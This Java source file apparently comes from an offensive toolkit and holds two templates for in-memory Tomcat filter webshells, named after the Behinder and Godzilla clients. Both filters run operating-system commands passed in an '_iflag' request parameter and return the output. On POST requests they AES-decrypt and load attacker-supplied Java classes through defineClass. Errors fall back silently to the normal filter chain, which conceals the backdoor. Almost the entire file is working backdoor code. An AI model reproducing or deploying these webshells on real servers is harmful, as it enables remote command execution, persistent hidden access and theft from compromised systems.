package com.droplab.Utils.Memory.Tomcat.Filter;

import com.droplab.Utils.Memory.Interface.ImplInterface;

import java.lang.reflect.Field;

public class FilterImplStr implements ImplInterface {
    private final String FilterImplBehinder="import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.*;\n" +
            "import javax.servlet.http.HttpServletRequest;\n" +
            "import javax.servlet.http.HttpServletResponse;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.HashMap;\n" +
            "\n" +
            "public class %s implements Filter {\n" +
            "    public %s(){}\n" +
            "    @Override\n" +
            "    public void init(FilterConfig filterConfig) throws ServletException {\n" +
            "    }\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n" +
            "        try {\n" +
            "            HttpServletRequest request=(HttpServletRequest)servletRequest;\n" +
            "            HttpServletResponse response=(HttpServletResponse)servletResponse;\n" +
            "            String cmd = request.getParameter(\"_iflag\");\n" +
            "            if (cmd != null && !cmd.equals(\"\")) {\n" +
            "                if (request.getMethod().equals(\"POST\")) {\n" +
            "                    try {\n" +
            "                        String k = \"%s\";\n" +
            "                        HttpSession session = request.getSession();\n" +
            "                        session.putValue(\"u\", k);\n" +
            "                        Cipher c = Cipher.getInstance(\"AES\");\n" +
            "                        c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
            "                        HashMap hashMap = new HashMap();\n" +
            "                        hashMap.put(\"request\", request);\n" +
            "                        hashMap.put(\"response\", response);\n" +
            "                        hashMap.put(\"session\", session);\n" +
            "                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "                        Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "                        Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                        defineClass.setAccessible(true);\n" +
            "                        byte[] decode = c.doFinal(base64Decode(request.getReader().readLine()));\n" +
            "                        Class lisi = (Class) defineClass.invoke(clzLoader, decode, 0, decode.length);\n" +
            "                        lisi.newInstance().equals(hashMap);\n" +
            "                    } catch (Exception e) { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "                } else {\n" +
            "                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(\" \")).getInputStream();\n" +
            "                    ByteArrayOutputStream os = new ByteArrayOutputStream();\n" +
            "                    byte[] bytes = new byte[1024];\n" +
            "                    int a = -1;\n" +
            "                    while ((a = in.read(bytes)) != -1) {\n" +
            "                        os.write(bytes, 0, a);\n" +
            "                    }\n" +
            "                    response.getWriter().println(new String(os.toByteArray()));\n" +
            "                }\n" +
            "            } else { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "        } catch (Exception e) { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void destroy() {\n" +
            "    }\n" +
            "}";
    private final String FilterImplGodzilla="import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.*;\n" +
            "import javax.servlet.http.HttpServletRequest;\n" +
            "import javax.servlet.http.HttpServletResponse;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Method;\n" +
            "\n" +
            "public class %s implements Filter {\n" +
            "    public %s() {\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void init(FilterConfig filterConfig) throws ServletException {\n" +
            "    }\n" +
            "    public static String base64Encode(byte[] bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        String value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object Encoder = base64.getMethod(\"getEncoder\", null).invoke(base64, null);\n" +
            "            value = (String) Encoder.getClass().getMethod(\"encodeToString\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Encoder\");\n" +
            "                Object Encoder = base64.newInstance();\n" +
            "                value = (String) Encoder.getClass().getMethod(\"encode\", new Class[]{byte[].class}).invoke(Encoder, new Object[]{bs});\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    public static byte[] base64Decode(String bs) throws Exception {\n" +
            "        Class base64;\n" +
            "        byte[] value = null;\n" +
            "        try {\n" +
            "            base64 = Class.forName(\"java.util.Base64\");\n" +
            "            Object decoder = base64.getMethod(\"getDecoder\", null).invoke(base64, null);\n" +
            "            value = (byte[]) decoder.getClass().getMethod(\"decode\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "        } catch (Exception e) {\n" +
            "            try {\n" +
            "                base64 = Class.forName(\"sun.misc.BASE64Decoder\");\n" +
            "                Object decoder = base64.newInstance();\n" +
            "                value = (byte[]) decoder.getClass().getMethod(\"decodeBuffer\", new Class[]{String.class}).invoke(decoder, new Object[]{bs});\n" +
            "            } catch (Exception e2) {\n" +
            "            }\n" +
            "        }\n" +
            "        return value;\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void doFilter(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain) throws IOException, ServletException {\n" +
            "        try {\n" +
            "            HttpServletRequest request=(HttpServletRequest)servletRequest;\n" +
            "            HttpServletResponse response=(HttpServletResponse)servletResponse;\n" +
            "            String cmd = request.getParameter(\"_iflag\");\n" +
            "            if (cmd != null && !cmd.equals(\"\")) {\n" +
            "                if (request.getMethod().equals(\"POST\")) {\n" +
            "                    try {\n" +
            "                        String xc = \"%s\";\n" +
            "                        String pass = \"%s\";\n" +
            "                        String md5 = \"%s\".toUpperCase();\n" +
            "                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "                        Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "                        Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                        defineClass.setAccessible(true);\n" +
            "                        byte[] data = base64Decode(request.getParameter(pass));\n" +
            "                        Cipher c = Cipher.getInstance(\"AES\");\n" +
            "                        c.init(2, new SecretKeySpec(xc.getBytes(), \"AES\"));\n" +
            "                        byte[] bytes = c.doFinal(data);\n" +
            "                        HttpSession session = request.getSession();\n" +
            "                        if (session.getAttribute(\"payload\") == null) {\n" +
            "                            session.setAttribute(\"payload\", defineClass.invoke(clzLoader,bytes,0,bytes.length));\n" +
            "                        }else {\n" +
            "                            request.setAttribute(\"parameters\", bytes);\n" +
            "                            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();\n" +
            "                            Object f = ((Class) session.getAttribute(\"payload\")).newInstance();\n" +
            "                            f.equals(arrOut);\n" +
            "                            f.equals(bytes);\n" +
            "                            response.getWriter().write(md5.substring(0, 16));\n" +
            "                            f.toString();\n" +
            "                            c.init(1,new SecretKeySpec(xc.getBytes(),\"AES\"));\n" +
            "                            byte[] bytes1 = c.doFinal(arrOut.toByteArray());\n" +
            "                            response.getWriter().write(base64Encode(bytes1));\n" +
            "                            response.getWriter().write(md5.substring(16));\n" +
            "                        }\n" +
            "                    } catch (Exception e) { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "                } else {\n" +
            "                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(\" \")).getInputStream();\n" +
            "                    ByteArrayOutputStream os = new ByteArrayOutputStream();\n" +
            "                    byte[] bytes = new byte[1024];\n" +
            "                    int a = -1;\n" +
            "                    while ((a = in.read(bytes)) != -1) {\n" +
            "                        os.write(bytes, 0, a);\n" +
            "                    }\n" +
            "                    response.getWriter().println(new String(os.toByteArray()));\n" +
            "                }\n" +
            "            } else { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "        } catch (Exception e) { filterChain.doFilter(servletRequest, servletResponse); }\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void destroy() {\n" +
            "    }\n" +
            "}";

    @Override
    public String get(Object obj,String type,boolean template) {
        //org.apache.catalina.connector
        try {
            Field declaredField = obj.getClass().getDeclaredField("FilterImpl" + type);
            declaredField.setAccessible(true);
            return (String) declaredField.get(obj);
        }catch (Exception e){
            e.printStackTrace();
        }
        return null;
    }
}
